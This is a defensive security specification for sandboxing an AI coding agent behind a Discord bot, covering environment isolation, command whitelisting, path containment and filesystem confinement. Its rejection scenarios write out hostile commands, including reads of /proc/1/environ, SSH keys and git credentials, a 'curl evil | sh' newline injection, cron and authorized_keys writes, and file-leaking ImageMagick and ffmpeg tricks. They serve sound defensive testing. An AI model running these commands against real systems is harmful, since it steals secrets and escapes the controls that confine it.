# agent-sandbox-hardening Specification

## Purpose
TBD - created by archiving change fix-security-audit-findings. Update Purpose after archive.
## Requirements
### Requirement: Agent Subprocess Environment Isolation

The system SHALL spawn the ACP agent subprocess with a cleared parent environment so that the child receives ONLY the explicitly-built allowlisted environment variables and inherits NO variables from the parent bot process. The `Deno.Command` used to spawn the agent SHALL set `clearEnv: true`.

#### Scenario: Parent secret not inherited by agent

- **GIVEN** the parent bot process has an environment variable (e.g. `DISCORD_TOKEN`) that is NOT part of the agent's built environment
- **WHEN** the agent subprocess is spawned
- **THEN** that variable SHALL NOT be present in the agent subprocess's actual environment

#### Scenario: Allowlisted variables still provided

- **GIVEN** the agent configuration builds an environment containing `PATH`, `HOME`, `TMPDIR`, `DENO_DIR`, `SESSION_ID`, and `AGENT_WORKSPACE`
- **WHEN** the agent subprocess is spawned with `clearEnv: true`
- **THEN** the agent subprocess environment SHALL contain exactly those built variables (plus agent-type-specific variables) and nothing inherited from the parent

### Requirement: Entrypoint-Anchored Command Whitelist Matching

In restricted mode, the command whitelist matcher SHALL approve a skill-script execution only when the whitelisted script path is the actual invocation entrypoint. A whitelisted script path appearing merely as a trailing argument to an arbitrary command SHALL NOT be approved. The matcher SHALL tolerate a whitespace-delimited fd-to-fd redirection token (`N>&M` with the source descriptor `M` restricted to a standard stream, `1` or `2`; e.g. `2>&1`, `1>&2`) anywhere in the command: such a token SHALL be ignored for the shell-operator check, SHALL be skipped when locating the invocation entrypoint (it is not a real argument and MUST NOT be mistaken for the script), and SHALL NOT affect entrypoint resolution, so a skill invocation suffixed with `2>&1` — or carrying `2>&1` between `run` and the script — remains approved. The first-token allow-list check SHALL still operate on the original tokens so a redirect can never masquerade as the entrypoint. Only space/tab SHALL be treated as a token separator: a newline next to a tolerated token is a command separator and SHALL remain rejected. Any other shell operator, file-referencing redirection, or redirect whose source descriptor is not a standard stream SHALL continue to be rejected.

#### Scenario: Legitimate skill invocation approved

- **GIVEN** a command `deno run <flags> skills/memory-save/scripts/memory-save.ts <args>` where the script path is the entrypoint positional
- **WHEN** the matcher evaluates the command
- **THEN** it SHALL approve the command

#### Scenario: Skill invocation with trailing fd-to-fd redirect approved

- **GIVEN** a whitelisted skill script at `skills/memory-save/scripts/memory-save.ts`
- **WHEN** the matcher evaluates `deno run skills/memory-save/scripts/memory-save.ts --content-file $TMPDIR/$SESSION_ID/x.md 2>&1`
- **THEN** it SHALL approve the command because the entrypoint is the whitelisted script and the trailing `2>&1` token only duplicates file descriptor 1

#### Scenario: Arbitrary command with whitelisted script as trailing argument rejected

- **GIVEN** a command whose first token is an arbitrary binary (e.g. `tar`, `cat`) and whose trailing argument is a whitelisted script path (e.g. `cat /home/deno/.git-credentials skills/memory-save/scripts/memory-save.ts`)
- **WHEN** the matcher evaluates the command
- **THEN** it SHALL NOT approve the command

#### Scenario: Command-prefix skill with out-of-workspace path argument rejected

- **GIVEN** a command whose first token matches a whitelisted command prefix but whose arguments reference a path outside the workspace
- **WHEN** the matcher evaluates the command
- **THEN** it SHALL NOT approve the command

### Requirement: Agent Workspace Write Gating

The ACP client `ClientConfig` SHALL include a `canWriteAgentWorkspace` flag. Edit/write requests targeting the shared agent workspace SHALL be approved ONLY when `canWriteAgentWorkspace` is `true`, in addition to passing existing path and extension checks. This gate SHALL be enforced at BOTH the `requestPermission` edit/write branch AND the `writeTextFile` handler (which are separate code paths). Writes to the per-session TMPDIR SHALL remain allowed regardless of this flag.

#### Scenario: Ordinary user session cannot write agent workspace

- **GIVEN** a session with `canWriteAgentWorkspace` unset or `false`
- **WHEN** the agent requests to write a `.md` file inside the shared agent workspace
- **THEN** the request SHALL be rejected with logging

#### Scenario: Self-research session may write agent workspace

- **GIVEN** a session with `canWriteAgentWorkspace: true`
- **WHEN** the agent requests to write a `.md` file inside the shared agent workspace and the extension check passes
- **THEN** the request SHALL be approved

#### Scenario: TMPDIR write allowed regardless of flag

- **GIVEN** a session with `canWriteAgentWorkspace` unset or `false`
- **WHEN** the agent requests to write a file within the session TMPDIR
- **THEN** the request SHALL be approved (subject to the existing extension check)

#### Scenario: Write gating enforced at writeTextFile handler

- **GIVEN** a session with `canWriteAgentWorkspace` unset or `false`
- **WHEN** the agent invokes `writeTextFile` directly for an agent-workspace path (bypassing the permission prompt)
- **THEN** the write SHALL be rejected

### Requirement: Boundary-Safe Path Validation

All ACP client path boundary checks (`isPathAllowed`, `isAgentWorkspacePath`, `isWithinTmpDir`) SHALL treat a candidate path as inside a base directory only when the resolved candidate equals the resolved base OR begins with the resolved base followed by a path separator. A sibling path that merely shares a string prefix with the base SHALL be rejected. `readTextFile` SHALL additionally enforce an explicit read-extension allowlist (memory JSONL `.jsonl`, markdown `.md`, plain text `.txt`) and deny other extensions; this read allowlist is intentionally distinct from (and broader than) the write allowlist so legitimate agent reads of workspace memory files are not blocked.

#### Scenario: Sibling-prefix path rejected

- **GIVEN** a base directory `/data/workspaces/discord/123`
- **WHEN** a path `/data/workspaces/discord/1234/memory.private.jsonl` is validated
- **THEN** the validation SHALL reject the path as outside the base

#### Scenario: Genuine subpath accepted

- **GIVEN** a base directory `/data/workspaces/discord/123`
- **WHEN** a path `/data/workspaces/discord/123/memory.public.jsonl` is validated
- **THEN** the validation SHALL accept the path

#### Scenario: readTextFile allows operational workspace reads

- **GIVEN** an agent read request for `memory.public.jsonl` inside the workspace
- **WHEN** `readTextFile` evaluates the request
- **THEN** the read SHALL be allowed (the `.jsonl` extension is in the read allowlist)

#### Scenario: readTextFile enforces extension check

- **GIVEN** an agent read request for a path inside an allowed directory whose extension is NOT in the read allowlist (e.g. a `.json` cache file)
- **WHEN** `readTextFile` evaluates the request
- **THEN** the read SHALL be rejected

### Requirement: Filesystem-Touching Bash Tools Route Through the ACP Gate

The agent permission map (`agent-config/opencode.json`) SHALL NOT set a filesystem-touching bash tool to `"allow"` in the restricted (non-YOLO) profile, because an `"allow"` verdict causes OpenCode to self-authorize the tool call and return without forwarding it to the ACP client's `requestPermission()`, making the Layer-3 boundary unreachable. This applies to the entire set of file-reading or file-emitting utilities the profile exposes — not only the obvious `cat`/`head`/`tail`/`ls`/`find`, but also every equivalent read primitive (`rg`, `wc`, `file`, `tree`, `jq`, `pdftotext`, `pdfinfo`, `pdfimages`, `pdftoppm`, `pandoc`, `exiftool`, `ffprobe`), the media/archive tools that read and write files (`ffmpeg`, `magick`, `convert`, `identify`, `mogrify`, `unzip`, `zip`, `7zz`), and `agent-browser`. All such entries SHALL be configured `"ask"` so OpenCode forwards the decision to the ACP client, where boundary checks are enforced. (Skill-invocation patterns already matched by the ACP client's entrypoint-anchored logic may remain `"allow"`.)

#### Scenario: A read-capable bash tool is not self-authorized at the agent layer

- **GIVEN** the restricted-profile permission map
- **WHEN** the agent requests to execute any arbitrary-file-read primitive, e.g. `head -c 2000 /proc/1/environ`, `rg -a "" /proc/1/environ`, `jq -Rs . /proc/1/environ`, or `pandoc /proc/1/environ -t plain`
- **THEN** the corresponding bash entry SHALL be configured `"ask"` (not `"allow"`), so OpenCode forwards a `session/request_permission` to the ACP client rather than self-authorizing and executing it

#### Scenario: No filesystem-touching entry remains self-authorizing

- **GIVEN** the restricted-profile permission map
- **WHEN** its bash allow-list is inspected
- **THEN** no entry capable of reading or writing arbitrary file content (search/read utilities, document/media/archive tools, or `agent-browser`) SHALL be set to `"allow"`

### Requirement: Generic-Command Workspace Confinement

The restricted-mode ACP permission gate SHALL approve a generic bash command (a command whose first token is on an explicit allow-list) ONLY when every path-like argument — both inputs and outputs — resolves inside the session workspace, the session TMPDIR, the agent workspace, or the session-scoped OpenCode tool-output directory, AND the command contains no code-execution / arbitrary-target argument flag (e.g. `find -exec`/`-delete`/`-fprintf`, `rg --pre`). A command referencing any path outside those boundaries (as a read source OR a write/output target), or using such a flag, SHALL be rejected. The shared, home-rooted OpenCode tool-output directory (`$HOME/.local/share/opencode/tool-output` or any other home-rooted location) SHALL NOT be within bounds.

A generic command SHALL be rejected when it contains shell operators that enable command chaining or file redirection (`;`, `|`, `&`, backtick, `$()`, `>`, `<`, `#`, newline). An exception SHALL apply to a whitespace-delimited argument token that is EXACTLY `N>&M`, where `N` is one-or-more decimal digits and `M` is the descriptor of a standard stream (`1` or `2`; e.g. `2>&1`, `1>&2`, `3>&1`): such a token duplicates an already-open standard output/error stream and references no path on disk, so it SHALL be removed from the shell-operator check and SHALL NOT be treated as a path argument. The removal SHALL treat only space/tab as a token separator — a newline next to a tolerated token is a shell command separator, NOT a token boundary, so the filtered command SHALL retain the newline and SHALL be rejected. Any other redirection form SHALL remain rejected, including redirects to a file (`2>/dev/null`, `2>/tmp/x`, `> file`), `>&word` with a non-numeric `word`, digit-prefixed filenames (`2>&1/tmp/x`, `2>&1x`) which a shell opens for writing, and redirects whose source descriptor is not a standard stream (`1>&3`, `2>&3`, `9>&99`) — these are not exact `N>&[12]` tokens and remain subject to the shell-operator and path-containment rejections.

Home-anchored argument tokens SHALL be expanded against the runtime values before the containment check: the exact forms `~`, `~/...`, `$HOME`, `$HOME/...`, `${HOME}`, `${HOME}/...` SHALL expand the `~`/`$HOME` reference to the runtime home directory, and `$XDG_DATA_HOME`, `$XDG_DATA_HOME/...`, `${XDG_DATA_HOME}`, `${XDG_DATA_HOME}/...` SHALL expand to the session's `XDG_DATA_HOME` value. Expansion SHALL be applied to the token after quote stripping and `--flag=value` splitting, including inside attached option values (e.g. `-o$HOME/...`), so an attached option carrying an expanded absolute path is subject to the same attached-absolute-path rejection as a literal one. The containment check SHALL be applied to the expanded path, so a token that expands outside an allowed directory (e.g. `~/.ssh/id_rsa`, `$HOME/.git-credentials`, `$HOME/../etc/passwd`, `-o$HOME/.ssh/x`) SHALL be rejected. Any other home-anchored token (e.g. `~otheruser/...`, `~notexpanded`) SHALL be rejected.

Attached short-option values SHALL be rejected when they are absolute or traversal-anchored: a `-`-prefixed token whose glued value starts with `/` or `..`, or contains `/../` (e.g. `-o/etc/cron.d`, `-f../sibling-user/file`, `-o../x`, `-oout/../x`), SHALL be rejected — such values resolve against the agent's cwd and escape the workspace. Bare flags (`-r`) and safe attached values (`-n5`, `-fprogram.jq`) SHALL pass.

A path argument that resolves inside the session's OpenCode data area (`{sessionWorkspace}/tmp/opencode-data`) but OUTSIDE the session's own data home SHALL be rejected even though it lexically resolves inside the session workspace: sibling/previous sessions' truncated tool outputs (and the data-area root listing that would enumerate them) are never within bounds, while the session's own data home remains readable.

The allow-list SHALL be limited to plain search/read/stat utilities whose only file access is via ordinary path arguments the lexical check can see — i.e. `rg`, `cat`, `head`, `tail`, `ls`, `find`, `wc`, `file`, `tree`, `jq`, `pdftotext`, `pdfinfo`, `pdfimages`, `pdftoppm`. Tools that read or write files through their own argument DSL, an argument/response indirection file, an embedded protocol/coder, or a filter/preprocessor that executes code (e.g. ImageMagick `magick`/`convert`/`identify`/`mogrify` via `caption:@`/`label:@`/`msl:` coders, `exiftool -@` argfiles, `ffmpeg`/`ffprobe` protocols like `-f lavfi -i movie=`, `pandoc --lua-filter`, and the `unzip`/`zip`/`7zz` archive tools via attached `-o` output or archive path traversal) SHALL NOT be on the allow-list, because a lexical path check cannot bound them; they are only safe under the filesystem confinement (D4) and remain default-deny at this gate until it is active. Interpreters and mutating system tools (e.g. `python`, `git`, `rm`, `mv`, `dd`, `chmod`, `mkdir`) SHALL NOT be on the allow-list and SHALL remain default-deny.

#### Scenario: In-workspace generic command approved

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `rg pattern /app/data/workspaces/discord/123/` or `head /app/data/workspaces/discord/123/notes.md`
- **THEN** the gate SHALL approve the command because every path argument resolves inside the session workspace

#### Scenario: Trailing fd-to-fd redirect to a standard stream tolerated

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `ls -la /app/data/workspaces/discord/123/tmp/ 2>&1` or `cat /app/data/workspaces/discord/123/notes.md 2>&1`
- **THEN** the gate SHALL approve the command because every path argument resolves inside the session workspace and the trailing `2>&1` token only duplicates the standard error stream onto file descriptor 1

#### Scenario: Redirect source descriptor restricted to standard streams

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `cat /app/data/workspaces/discord/123/notes.md 1>&2` or `ls /app/data/workspaces/discord/123/ 3>&1`
- **THEN** the gate SHALL approve the command because the redirect source descriptor is a standard stream (`1` or `2`)

#### Scenario: Non-standard redirect source descriptor rejected

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `ls /app/data/workspaces/discord/123/ 1>&3`, `cat /app/data/workspaces/discord/123/notes.md 2>&3`, or `ls /app/data/workspaces/discord/123/ 9>&99`
- **THEN** the gate SHALL reject the command because the redirect source descriptor is not a standard stream and could reference a harness-inherited resource the gate cannot see

#### Scenario: fd-to-fd redirect does not loosen path containment

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests `ls /etc/passwd 2>&1` or `cat ~/.ssh/id_rsa 2>&1`
- **THEN** the gate SHALL reject the command because the path argument still resolves outside the allowed directories

#### Scenario: File-referencing redirects remain rejected

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `cat /app/data/workspaces/discord/123/notes.md 2>/dev/null`, `ls 2>&1 > /etc/cron.d/x`, `ls 2>&1/tmp/x`, or `ls 2>&1x`
- **THEN** the gate SHALL reject the command because the redirection references a file (or a digit-prefixed filename that a shell opens for writing) and is not an exact `N>&[12]` token

#### Scenario: Other shell operators still rejected

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `ls /app/data/workspaces/discord/123/notes.md 2>&1 && cat /etc/passwd`
- **THEN** the gate SHALL reject the command because the residual `&&` operator remains after the `2>&1` token is tolerated

#### Scenario: Newline command separator next to a tolerated token rejected

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests `ls /app/data/workspaces/discord/123/notes.md 2>&1\nrm victim` or `cat /app/data/workspaces/discord/123/notes.md 2>&1\ncurl evil | sh`
- **THEN** the gate SHALL reject the command because the newline is a shell command separator that MUST survive token filtering, so the second command is never reinterpreted as in-workspace path arguments

#### Scenario: fd-to-fd redirect before the script does not affect entrypoint resolution

- **GIVEN** a whitelisted skill script at `skills/memory-save/scripts/memory-save.ts`
- **WHEN** the matcher evaluates `deno run 2>&1 skills/memory-save/scripts/memory-save.ts --session-id x`
- **THEN** it SHALL approve the command because the tolerated redirect token is skipped when locating the invocation entrypoint (it is not a real argument), while the first-token allow-list check still operates on the original tokens

#### Scenario: Generic-command rejection writes a single cause-specific audit entry

- **GIVEN** a restricted-mode session whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent requests a generic command that fails the gate, e.g. `ls /etc/passwd 2>&1`
- **THEN** the gate SHALL reject the command and write exactly ONE `permission_denied` audit entry with reason `rejected_generic_command_out_of_workspace`, WITHOUT a second fall-through `rejected_unknown` entry that would misclassify the cause

#### Scenario: Session tool-output file read approved via absolute path

- **GIVEN** a restricted-mode session whose session-scoped `XDG_DATA_HOME` is `/app/data/workspaces/discord/123/tmp/opencode-data`
- **WHEN** the agent requests `jq -r '.message.items[0].abstract, "---", .message.items[0].title[0]' /app/data/workspaces/discord/123/tmp/opencode-data/opencode/tool-output/tool_ff80f6564001UdX4UoUmlKdpjY`
- **THEN** the gate SHALL approve the command because every path argument resolves inside the session tool-output directory

#### Scenario: Session tool-output file read approved via XDG_DATA_HOME reference

- **GIVEN** a restricted-mode session whose session-scoped `XDG_DATA_HOME` is `/app/data/workspaces/discord/123/tmp/opencode-data`
- **WHEN** the agent requests `cat $XDG_DATA_HOME/opencode/tool-output/tool_x` or `cat ${XDG_DATA_HOME}/opencode/tool-output/tool_x`
- **THEN** the gate SHALL expand the reference and approve the command because the expanded path resolves inside the session tool-output directory

#### Scenario: Shared home-rooted tool-output directory never within bounds

- **GIVEN** a restricted-mode session whose runtime `HOME` is `/home/deno`
- **WHEN** the agent requests `cat ~/.local/share/opencode/tool-output/tool_x`, `cat $HOME/.local/share/opencode/tool-output/tool_x`, or `cat /home/deno/.local/share/opencode/tool-output/tool_x`
- **THEN** the gate SHALL reject the command because the shared home-rooted tool-output directory is not within bounds

#### Scenario: Home-anchored sensitive file still rejected

- **GIVEN** a restricted-mode session whose runtime `HOME` is `/home/deno`
- **WHEN** the agent requests `cat ~/.ssh/id_rsa`, `cat $HOME/.git-credentials`, `cat $HOME/../etc/passwd`, `cat '${HOME}/.ssh/known_hosts'`, or `cat -o$HOME/.ssh/x`
- **THEN** the gate SHALL reject the command because the expanded path resolves outside every allowed directory or is an attached absolute path

#### Scenario: Attached short-option traversal rejected

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests `jq -f../other-user/program.jq data.json`, `pdftoppm in.pdf -o../x`, or `rg -f/../etc/passwd .`
- **THEN** the gate SHALL reject the command because the glued option value is absolute or traversal-anchored and would escape the workspace
- **AND** `jq -fprogram.jq data.json` and `head -n5 notes.md` SHALL be approved (bare flags and safe attached values)

#### Scenario: Unexpandable home-anchored token rejected

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests `cat ~otheruser/notes.md` or `cat ~notexpanded/file`
- **THEN** the gate SHALL reject the command because the home-anchored token is not in an expandable form

#### Scenario: Out-of-workspace read rejected

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests `rg -a "" /proc/1/environ`, `head -c 2000 /proc/1/environ`, or `head /app/data/workspaces/discord/<otherUser>/memory.private.jsonl`
- **THEN** the gate SHALL reject the command with logging because a path argument resolves outside the allowed directories

#### Scenario: Out-of-workspace output target rejected

- **GIVEN** a restricted-mode session and an allow-listed tool that writes an output file (e.g. `pdftoppm`, `pdfimages`)
- **WHEN** the agent requests an out-of-workspace output path, e.g. `pdftoppm in.pdf /etc/cron.d/evil` or `pdftoppm in.pdf ~/.ssh/authorized_keys`
- **THEN** the gate SHALL reject the command because the output path resolves outside the allowed directories

#### Scenario: File-DSL / indirection tool not covered by the allow-list

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests a tool whose argument DSL can reach arbitrary files, e.g. `magick -size 400x100 caption:@/proc/1/environ tmp/leak.png`, `exiftool -@ tmp/args.txt`, `ffmpeg -f lavfi -i movie=/etc/passwd out.mp4`, or `7zz x a.7z -o/etc/cron.d/`
- **THEN** the allow-list SHALL NOT approve it (the tool is excluded from the allow-list; it is only safe under D4 confinement)

#### Scenario: Code-execution / arbitrary-target flag rejected

- **GIVEN** a restricted-mode session and an allow-listed tool
- **WHEN** the agent requests a command using a code-execution or arbitrary-target flag, e.g. `find . -exec rm {} +`, `find . -delete`, or `rg --pre sh needle .`
- **THEN** the gate SHALL reject the whole command even if every path-like argument resolves in-workspace

#### Scenario: Mutating system command not covered by the allow-list

- **GIVEN** a restricted-mode session
- **WHEN** the agent requests an interpreter or mutating tool such as `python`, `git`, `rm`, or `mkdir` against an in-workspace path
- **THEN** the allow-list SHALL NOT approve it (it remains subject to default-deny / existing rules)

### Requirement: Per-Session Tool-Output Isolation

The system SHALL spawn the ACP agent subprocess with a session-scoped `XDG_DATA_HOME` environment variable whose value is a directory inside the session's TMPDIR, so that OpenCode writes its `tool-output/` directory (and other data-dir artifacts) into that session's own directory instead of the shared `$HOME/.local/share/opencode/` data directory. When the session has a session id (skill-backed sessions), the value SHALL be `{sessionWorkspace}/tmp/opencode-data/{sessionId}`; sessions without one (internal system sessions with dedicated workspaces) use `{sessionWorkspace}/tmp/opencode-data`. The sandbox environment filter SHALL include `XDG_DATA_HOME` in its allowed base environment variables. The session-scoped value SHALL be deterministic from the session workspace path and session id alone, so both the subprocess environment and the permission gate derive the same directory without reading the parent process's `XDG_DATA_HOME`. The permission gate SHALL reject any path that resolves inside the session's OpenCode data area (`{sessionWorkspace}/tmp/opencode-data`) but outside the session's own data home — sibling/previous sessions' data dirs are never readable, even though they lexically resolve inside the workspace. The workspace TMPDIR (including the data area) SHALL be removed when no active sessions remain for the workspace.

#### Scenario: Agent subprocess receives session-scoped XDG_DATA_HOME

- **GIVEN** a session with id `sess_own` whose workspace is `/app/data/workspaces/discord/123`
- **WHEN** the agent subprocess is spawned with sandbox env filtering enabled
- **THEN** the subprocess environment SHALL contain `XDG_DATA_HOME=/app/data/workspaces/discord/123/tmp/opencode-data/sess_own`

#### Scenario: Truncated tool outputs land inside the session workspace

- **GIVEN** an agent subprocess with session-scoped `XDG_DATA_HOME=/app/data/workspaces/discord/123/tmp/opencode-data/sess_own`
- **WHEN** OpenCode truncates a tool output
- **THEN** the saved file SHALL be written under `/app/data/workspaces/discord/123/tmp/opencode-data/sess_own/opencode/tool-output/`

#### Scenario: Shared data directory is not written by the agent

- **GIVEN** an agent subprocess with session-scoped `XDG_DATA_HOME`
- **WHEN** OpenCode initializes its data directory
- **THEN** it SHALL NOT write into `$HOME/.local/share/opencode/` (the shared data directory remains untouched by agent sessions)

#### Scenario: Sibling/previous sessions' data dirs are not readable

- **GIVEN** a restricted-mode session with id `sess_own` whose workspace is `/app/data/workspaces/discord/123` (data area root `/app/data/workspaces/discord/123/tmp/opencode-data`)
- **WHEN** the agent requests `cat /app/data/workspaces/discord/123/tmp/opencode-data/sess_other/opencode/tool-output/tool_x` or `ls /app/data/workspaces/discord/123/tmp/opencode-data`
- **THEN** the gate SHALL reject the command — the path resolves inside the data area but outside the session's own data home (sibling/previous sessions' truncated tool outputs and the enumerating root listing are never within bounds)
- **AND** `cat /app/data/workspaces/discord/123/tmp/opencode-data/sess_own/opencode/tool-output/tool_x` SHALL be approved

#### Scenario: Shared data directory is not bound under filesystem confinement

- **GIVEN** a session running under bwrap filesystem confinement (`agent.sandbox.filesystemConfinement`)
- **WHEN** the confinement argv is built
- **THEN** the shared home-rooted OpenCode data directory (`$HOME/.local/share/opencode`) SHALL NOT be bound into the mount namespace — the agent's data dir lives under its session-scoped `XDG_DATA_HOME` inside the session workspace, and the shared dir is never written or visible to the confined process

### Requirement: OpenCode Tool-Output Directory Boundary

The restricted-mode ACP permission gate SHALL add the session-scoped OpenCode tool-output directory to its generic-command containment boundaries ONLY when the resolved directory is inside the session workspace or the session TMPDIR. When it is (the normal case under per-session `XDG_DATA_HOME` isolation), the directory SHALL be added without duplication if it is not already contained by an existing allowed directory (containment test direction: the candidate is contained by an existing allowed directory). When it is NOT inside the session workspace/TMPDIR, the directory SHALL NOT be added and the gate SHALL fail closed — the shared home-rooted tool-output directory SHALL never be within bounds.

#### Scenario: Session-local tool-output directory added to the boundary

- **GIVEN** a session whose tool-output directory resolves to `/app/data/workspaces/discord/123/tmp/opencode-data/opencode/tool-output`
- **WHEN** the gate assembles its allowed directories
- **THEN** the directory SHALL be included in the generic-command containment boundaries

#### Scenario: Boundary deduplicated when already contained

- **GIVEN** a session whose tool-output directory resolves inside an existing allowed directory (e.g. the session workspace)
- **WHEN** the gate assembles its allowed directories
- **THEN** the directory SHALL NOT be added a second time

#### Scenario: Non-session-local tool-output directory fails closed

- **GIVEN** a session whose tool-output directory would resolve outside the session workspace/TMPDIR
- **WHEN** the gate assembles its allowed directories
- **THEN** the directory SHALL NOT be added, and a generic command referencing it SHALL be rejected

### Requirement: Agent Filesystem Confinement

When filesystem confinement is enabled (`sandbox.filesystemConfinement`), the agent subprocess SHALL run under a filesystem confinement that prevents it from reading the daemon's process environment (`/proc/1/environ`) and other users' workspace directories, independent of the permission-layer configuration, so that a permissive or misconfigured permission map cannot re-expose those paths. Because the container runs unprivileged under a single UID (OpenShift arbitrary-UID model), the confinement SHALL be achieved by a filesystem-namespace mechanism (bubblewrap mount namespace with a fresh `/proc`) rather than by switching the subprocess to a second UID. If confinement is enabled but the mechanism is unavailable in the runtime, the system SHALL fail closed at startup with an actionable error rather than starting the agent unconfined.

Confinement is OPT-IN (default off) because the fresh-`/proc` mount it relies on cannot be established inside a doubly-nested user namespace (e.g. rootless podman) and its viability is therefore runtime-dependent and SHALL be verified against the real deployment (`scripts/probe-sandbox-caps.sh`) before enabling; the authoritative permission gate (`requestPermission` routing, generic-command confinement, URI-scheme rejection) provides the primary protection independent of this defense-in-depth layer.

On Kubernetes the mechanism's availability depends on a chain of runtime prerequisites, established empirically on Talos 1.7.2 / K8s 1.30 / containerd 1.7: (1) the node must permit unprivileged user namespaces (`user.max_user_namespaces > 0`); (2) the pod must not run under the default containerd seccomp profile, which gates `unshare`/`clone(CLONE_NEWUSER)` on `CAP_SYS_ADMIN`, so an explicit `seccompProfile` and a relaxed PodSecurity level are required; (3) the CRI's `MNT_LOCKED` masked `/proc` paths make the kernel refuse a fresh procfs mount, requiring `securityContext.procMount: Unmasked`, which since K8s 1.30 additionally requires `hostUsers: false` and therefore containerd 2.0+ (or CRI-O ≥ 1.25). Documented in `docs/AGENT_PERMISSIONS.md` and `helm/values.yaml`. Clusters that cannot satisfy the chain SHALL keep `filesystemConfinement` disabled and rely on the always-on protections.

#### Scenario: Daemon environ not readable by the agent

- **GIVEN** a confined agent subprocess
- **WHEN** the agent attempts to read `/proc/1/environ`
- **THEN** the read SHALL fail (the daemon's environment, including its secrets, is not visible to the agent)

#### Scenario: Cross-user workspace not readable by the agent

- **GIVEN** a confined agent subprocess for user A
- **WHEN** the agent attempts to read `/app/data/workspaces/discord/<userB>/memory.private.jsonl`
- **THEN** the read SHALL fail because user B's workspace is outside the confined filesystem view

#### Scenario: Confinement unavailable fails closed

- **GIVEN** a runtime that does not support the configured confinement mechanism
- **WHEN** the daemon starts and prepares to spawn the agent
- **THEN** it SHALL fail startup with an actionable error rather than spawn the agent without confinement

#### Scenario: Kubernetes runtime cannot satisfy the requirement chain

- **GIVEN** a Kubernetes cluster whose runtime cannot satisfy the full chain (e.g. containerd 1.7, which rejects the `hostUsers: false` that `procMount: Unmasked` requires since K8s 1.30)
- **WHEN** the operator configures the deployment
- **THEN** the documented guidance SHALL be to keep `filesystemConfinement` disabled and rely on the always-on permission gate, environment filtering, and egress mediation
- **AND** if it is enabled anyway, startup SHALL fail closed rather than run the agent unconfined

